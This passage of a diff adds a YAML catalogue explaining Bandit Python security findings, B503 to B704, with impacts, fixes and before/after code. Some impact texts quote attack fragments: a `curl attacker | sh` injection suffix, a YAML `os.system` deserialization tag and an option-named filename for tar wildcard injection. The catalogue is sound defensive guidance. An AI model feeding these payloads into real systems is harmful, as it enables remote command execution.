+    TLS 1.1) is explicitly requested.
+  impact: >
+    Old protocol versions have known breaks - POODLE, BEAST, downgrade
+    attacks - so an active attacker can decrypt or tamper with what the
+    connection believes is protected.
+  fix: >
+    Request TLS 1.2 or later and let the library negotiate the best cipher:
+    `ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)` with default minimum version.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/insecure_ssl_tls.py
+    - https://cwe.mitre.org/data/definitions/326.html
+  cwe: CWE-326
+
+B503:
+  title: Bad SSL defaults used
+  description: >
+    The SSL context is configured with weak defaults - a cipher list
+    including export or anonymous suites, or verification relaxed from the
+    secure default.
+  impact: >
+    Weak or anonymous ciphers offer no real protection: export suites are
+    breakable in real time and anonymous suites authenticate nobody, so the
+    endpoint can be imitated or the traffic decrypted.
+  fix: >
+    Use `ssl.create_default_context()`, which sets TLS 1.2+, verification on
+    and modern ciphers, and change only what you have a concrete reason to
+    change.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/insecure_ssl_tls.py
+    - https://cwe.mitre.org/data/definitions/326.html
+  cwe: CWE-326
+
+B504:
+  title: SSL version not specified
+  description: >
+    An SSL context is created without pinning a protocol version, so the
+    library's (possibly old) default applies.
+  impact: >
+    On older interpreters or pinned OpenSSL builds the default can include
+    protocol versions with known attacks, leaving the connection weaker
+    than intended without any explicit decision to do so.
+  fix: >
+    Create the context with `ssl.create_default_context()` or set
+    `minimum_version = ssl.TLSVersion.TLSv1_2` explicitly so the floor is
+    part of the code.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/insecure_ssl_tls.py
+    - https://cwe.mitre.org/data/definitions/326.html
+  cwe: CWE-326
+
+B505:
+  title: Weak cryptographic key
+  description: >
+    A key below the accepted size is generated - RSA under 2048 bits, DSA
+    under 2048, ECC below 224 bits.
+  impact: >
+    The key can be factored or solved within its lifetime: once broken,
+    every message, session and signature protected by it is readable and
+    forgeable, including everything already recorded.
+  fix: >
+    Generate RSA keys of at least 3072 bits (2048 is the floor), or switch
+    to elliptic-curve keys (P-256 or better) via the cryptography library's
+    defaults.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/weak_cryptographic_key.py
+    - https://cwe.mitre.org/data/definitions/326.html
+  cwe: CWE-326
+
+B506:
+  title: YAML load used
+  description: >
+    yaml.load is called without a safe loader, so the YAML can instantiate
+    arbitrary Python objects - and constructing them executes code.
+  impact: >
+    A crafted YAML document runs arbitrary commands on the server the moment
+    it is loaded: `!!python/object/apply:os.system` is enough.
+  fix: |
+    Use yaml.safe_load for data:
+
+    ```python
+    # before
+    data = yaml.load(payload, Loader=yaml.Loader)
+
+    # after
+    data = yaml.safe_load(payload)
+    ```
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/yaml_load.py
+    - https://cwe.mitre.org/data/definitions/502.html
+  cwe: CWE-502
+
+B507:
+  title: SSH host key verification disabled
+  description: >
+    A paramiko connection is created with AutoAddPolicy or missing
+    HostKeyPolicy, so the server's identity is never checked.
+  impact: >
+    Anyone who can intercept the connection presents their own host key,
+    gets auto-accepted, and becomes the endpoint: credentials are captured
+    and every command and file passes through the attacker.
+  fix: |
+    Load and pin the expected host key:
+
+    ```python
+    # before
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    # after
+    host_keys = paramiko.HostKeys()
+    host_keys.load("/etc/ssh/wadjet_known_hosts")
+    client.get_host_keys().update(host_keys)
+    ```
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/ssh_no_host_key_verification.py
+    - https://cwe.mitre.org/data/definitions/295.html
+  cwe: CWE-295
+
+B508:
+  title: Insecure SNMP version
+  description: >
+    SNMPv1 or SNMPv2c is used. Both authenticate with a community string
+    sent in cleartext and have no encryption.
+  impact: >
+    Anyone on the network path reads the community string and every OID the
+    session queries - interface data, counters, device configuration - and
+    can replay it to query or set values themselves.
+  fix: >
+    Move to SNMPv3 with authPriv (AES encryption plus authentication), and
+    treat community strings like passwords if v1/v2 cannot be removed yet.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/snmp_security_check.py
+    - https://cwe.mitre.org/data/definitions/319.html
+  cwe: CWE-319
+
+B509:
+  title: Weak SNMP cryptography
+  description: >
+    SNMPv3 is configured with a weak privacy protocol such as DES instead of
+    AES.
+  impact: >
+    The privacy protocol protecting SNMP traffic can be broken, exposing
+    device configuration and credentials carried in the session to anyone
+    capturing packets.
+  fix: >
+    Configure SNMPv3 with `privproto=AES` (AES-128 or better) and long,
+    randomly generated auth and priv passwords.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/snmp_security_check.py
+    - https://cwe.mitre.org/data/definitions/327.html
+  cwe: CWE-327
+
+B601:
+  title: Paramiko call
+  description: >
+    A paramiko exec_command or shell invocation runs a command on a remote
+    host, often assembled from strings.
+  impact: >
+    If any part of the command came from outside the program, the remote
+    shell interprets metacharacters and the attacker runs their own commands
+    on the remote host.
+  fix: >
+    Pass a fixed argv list with no shell metacharacters, and validate or
+    allowlist every variable before it becomes an argument - never
+    concatenate input into the command string.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/injection_paramiko.py
+    - https://cwe.mitre.org/data/definitions/78.html
+  cwe: CWE-78
+
+B602:
+  title: Subprocess with shell=True (popen)
+  description: >
+    subprocess.Popen is called with shell=True, so the command string is
+    interpreted by /bin/sh with all its metacharacters.
+  impact: >
+    Any attacker-controlled fragment of the string - a filename, a host, a
+    search term - can end with `; curl attacker | sh` and run arbitrary
+    commands as the application.
+  fix: |
+    Drop the shell and pass arguments as a list:
+
+    ```python
+    # before
+    subprocess.Popen("grep %s file" % user_input, shell=True)
+
+    # after
+    subprocess.Popen(["grep", user_input, "file"])
+    ```
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/injection_shell.py
+    - https://cwe.mitre.org/data/definitions/78.html
+  cwe: CWE-78
+
+B603:
+  title: Subprocess without shell (exec)
+  description: >
+    subprocess is used without a shell. That is the safe pattern, but the
+    arguments are still executed as a program, so unvalidated paths or
+    arguments remain dangerous.
+  impact: >
+    If an argument chooses the executable or its path (for example a
+    user-supplied filename passed to a converter), an attacker can point the
+    call at their own program and get it executed with the application's
+    privileges.
+  fix: >
+    Keep the list form, but validate what goes into it: allowlist the
+    executable, reject path separators in user-supplied names, and use
+    absolute paths for the program.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/injection_shell.py
+    - https://cwe.mitre.org/data/definitions/78.html
+  cwe: CWE-78
+
+B604:
+  title: Function call with shell=True
+  description: >
+    A generic function call (os.system, os.popen or similar) runs a command
+    line through the shell.
+  impact: >
+    Shell metacharacters in any interpolated value execute as commands, so
+    attacker-controlled input turns the call into remote code execution as
+    the application user.
+  fix: >
+    Replace the call with subprocess.run([...], check=True) using a list of
+    arguments and no shell, and validate every value that becomes an
+    argument first.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/injection_shell.py
+    - https://cwe.mitre.org/data/definitions/78.html
+  cwe: CWE-78
+
+B605:
+  title: Start process with a shell
+  description: >
+    os.startfile, os.system or an equivalent starts a process through the
+    shell or the OS shell verb.
+  impact: >
+    Untrusted fragments in the command line are interpreted by the shell, so
+    an attacker appends their own command and runs it with the application's
+    privileges.
+  fix: >
+    Build the command as a list and use subprocess without a shell, and
+    allowlist which programs may be started.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/injection_shell.py
+    - https://cwe.mitre.org/data/definitions/78.html
+  cwe: CWE-78
+
+B606:
+  title: Start process without a shell
+  description: >
+    A process is started with an argument list but no shell - the right
+    shape, though the arguments themselves may still be unvalidated.
+  impact: >
+    If an argument selects what gets executed (a path, a converter name), an
+    attacker redirects the call to a program of their choosing.
+  fix: >
+    Validate arguments against an allowlist, reject path separators in
+    user-supplied values, and invoke executables by absolute path.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/injection_shell.py
+    - https://cwe.mitre.org/data/definitions/78.html
+  cwe: CWE-78
+
+B607:
+  title: Start process with partial path
+  description: >
+    A program is launched by a relative name (for example "python" or
+    "git"), so whichever matching file comes first on PATH is executed.
+  impact: >
+    If an attacker can place a file earlier on PATH - a writable working
+    directory, a user-controlled container layer - their binary runs instead
+    of the one you meant, with your application's privileges.
+  fix: >
+    Invoke by absolute path (`/usr/bin/git`) or resolve the executable once
+    at startup with shutil.which and pin that result.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/injection_shell.py
+    - https://cwe.mitre.org/data/definitions/78.html
+  cwe: CWE-78
+
+B608:
+  title: Hardcoded SQL expression
+  description: >
+    A SQL string is built with Python string formatting or concatenation,
+    the shape that becomes SQL injection when any part is user input.
+  impact: >
+    Attacker-controlled input becomes SQL: read every row the application
+    can reach, escalate an account to admin, or - with stacked queries -
+    modify and delete data.
+  fix: |
+    Use bound parameters; the driver treats values as data, never SQL:
+
+    ```python
+    # before
+    cursor.execute("SELECT * FROM users WHERE name = '%s'" % name)
+
+    # after
+    cursor.execute("SELECT * FROM users WHERE name = %s", (name,))
+    ```
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/injection_sql.py
+    - https://cwe.mitre.org/data/definitions/89.html
+  cwe: CWE-89
+
+B609:
+  title: Linux wildcard injection
+  description: >
+    A shell command uses wildcards (cp *, tar *) and part of the command
+    line comes from files or names the application does not fully control.
+  impact: >
+    A file named like an option (`--checkpoint-action=exec=sh`) or a crafted
+    archive entry is interpreted by the tool as instructions, and the
+    wildcard expands to include it - running the attacker's command.
+  fix: >
+    Avoid wildcards in shell commands: enumerate paths in Python and pass
+    them as explicit arguments, and use `--` before path arguments so names
+    starting with a dash cannot become options.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/injection_wildcard.py
+    - https://cwe.mitre.org/data/definitions/78.html
+  cwe: CWE-78
+
+B610:
+  title: Django extra() used
+  description: >
+    QuerySet.extra() injects raw SQL fragments into a Django query, outside
+    the parameterization the ORM provides.
+  impact: >
+    A fragment assembled from anything untrusted is SQL: the attacker
+    rewrites the query to dump or modify data the view was never meant to
+    reach.
+  fix: >
+    Move the fragment into annotate(), Func() expressions or
+    extra(where=[...]) with parameters; if you truly need raw SQL, use
+    RawSQL with bound parameters instead of string assembly.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/django_sql_injection.py
+    - https://cwe.mitre.org/data/definitions/89.html
+  cwe: CWE-89
+
+B611:
+  title: Django raw SQL used
+  description: >
+    QuerySet.raw() executes a SQL string directly, bypassing the ORM's
+    escaping whenever interpolation reaches it.
+  impact: >
+    Interpolated input becomes SQL statements: an attacker reads or changes
+    data across tables, and depending on database privileges, beyond them.
+  fix: |
+    Pass parameters separately so the values stay data:
+
+    ```python
+    # before
+    Person.objects.raw("SELECT * FROM people WHERE name = '%s'" % name)
+
+    # after
+    Person.objects.raw("SELECT * FROM people WHERE name = %s", [name])
+    ```
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/django_sql_injection.py
+    - https://cwe.mitre.org/data/definitions/89.html
+  cwe: CWE-89
+
+B612:
+  title: Insecure logging config listener
+  description: >
+    A logging configuration starts a socket listener (listen=True), which
+    accepts log records from the network without authentication.
+  impact: >
+    Anyone who can reach the port sends log records into your logs - forging
+    entries to hide an attack or inject control characters - and depending
+    on the handler, the configuration channel itself becomes a remote
+    foothold.
+  fix: >
+    Never enable listen=True in production. Log to files or stdout and let
+    the log shipper, which authenticates its peers, collect them.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/logging_config_insecure_listen.py
+    - https://cwe.mitre.org/data/definitions/306.html
+  cwe: CWE-306
+
+B613:
+  title: Trojan source
+  description: >
+    Source contains bidirectional or unusual Unicode control characters
+    (for example RTL overrides), so the editor and the interpreter can read
+    the line differently.
+  impact: >
+    Code that looks harmless on screen is executed differently by Python:
+    an attacker hides the real logic behind the visual order, smuggling
+    malicious statements past human review into the interpreter.
+  fix: >
+    Remove the control characters and re-apply the intended formatting; add
+    `# -*- coding: utf-8 -*-` awareness to reviews and let CI reject files
+    containing bidi control code points.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/trojansource.py
+    - https://cwe.mitre.org/data/definitions/436.html
+  cwe: CWE-436
+
+B614:
+  title: PyTorch load used
+  description: >
+    torch.load deserializes a checkpoint with pickle under the hood, so
+    loading an untrusted .pt file executes code from the file.
+  impact: >
+    A model downloaded from the internet or shared by another team can carry
+    arbitrary Python: loading it runs the author's code on your GPU host,
+    with your credentials and data in reach.
+  fix: |
+    Only load checkpoints you produced, or load weights without pickle:
+
+    ```python
+    # before
+    model = torch.load("model.pt")
+
+    # after
+    model = torch.load("model.pt", weights_only=True)
+    ```
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/pytorch_load.py
+    - https://cwe.mitre.org/data/definitions/502.html
+  cwe: CWE-502
+
+B615:
+  title: HuggingFace unsafe download
+  description: >
+    A HuggingFace resource is loaded with trust_remote_code or pickle-based
+    deserialization enabled, running code bundled with the model.
+  impact: >
+    The model repository's code executes on your machine the moment it is
+    loaded: anyone who can publish or compromise that repo gets command
+    execution in your environment.
+  fix: >
+    Load models with trust_remote_code disabled and prefer architectures the
+    library implements natively; pin revision hashes and review any
+    repository before granting it code execution.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/huggingface_unsafe_download.py
+    - https://cwe.mitre.org/data/definitions/494.html
+  cwe: CWE-494
+
+B701:
+  title: Jinja2 autoescape disabled
+  description: >
+    A Jinja2 environment or template is created with autoescape off, so
+    variables are rendered into HTML without escaping.
+  impact: >
+    Any value that came from a user is written into the page verbatim:
+    stored cross-site scripting that runs in every viewer's session -
+    session theft, actions in their name.
+  fix: |
+    Turn autoescape back on and escape only where you truly mean HTML:
+
+    ```python
+    # before
+    Environment(autoescape=False)
+
+    # after
+    Environment(autoescape=select_autoescape(["html", "xml"]))
+    ```
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/jinja2_templates.py
+    - https://cwe.mitre.org/data/definitions/79.html
+  cwe: CWE-79
+
+B702:
+  title: Mako templates used
+  description: >
+    Mako templates are in use. Mako does not escape by default, so rendered
+    values become raw HTML unless every expression is marked up by hand.
+  impact: >
+    One unescaped `${value}` fed from user input is stored cross-site
+    scripting: the payload executes in the browser of everyone who views
+    the page.
+  fix: >
+    Enable Mako's built-in escaping (`default_filters=['h']` on the
+    Template orLookupTemplate) and audit remaining calls to n() /
+    filters='' that intentionally bypass it.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/mako_templates.py
+    - https://cwe.mitre.org/data/definitions/79.html
+  cwe: CWE-79
+
+B703:
+  title: Django mark_safe in template
+  description: >
+    A template marks a value safe (|safe or mark_safe), telling Django's
+    engine to skip escaping for it.
+  impact: >
+    Whatever the value contains is rendered as HTML. If part of it was
+    written by a user, that is stored cross-site scripting executing in
+    every viewer's session.
+  fix: >
+    Escape the data and mark only the structure: use format_html() with
+    placeholders, or remove |safe from the template and let autoescaping do
+    its job.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/django_xss.py
+    - https://cwe.mitre.org/data/definitions/79.html
+  cwe: CWE-79
+
+B704:
+  title: MarkupSafe Markup XSS
+  description: >
+    markupsafe.Markup wraps a string as safe HTML, disabling escaping for it
+    wherever it is rendered.
+  impact: >
+    Attacker-controlled content inside the Markup is emitted verbatim into
+    the page: stored cross-site scripting that runs in the session of every
+    user who sees it.
+  fix: >
+    Build the safe parts as the template and interpolate data with
+    escape()/Markup formatting arguments, so user values stay escaped:
+    `Markup("<b>%s</b>") % user_value`.
+  references:
+    - https://github.com/PyCQA/bandit/blob/main/bandit/plugins/markupsafe_markup_xss.py
+    - https://cwe.mitre.org/data/definitions/79.html
+  cwe: CWE-79
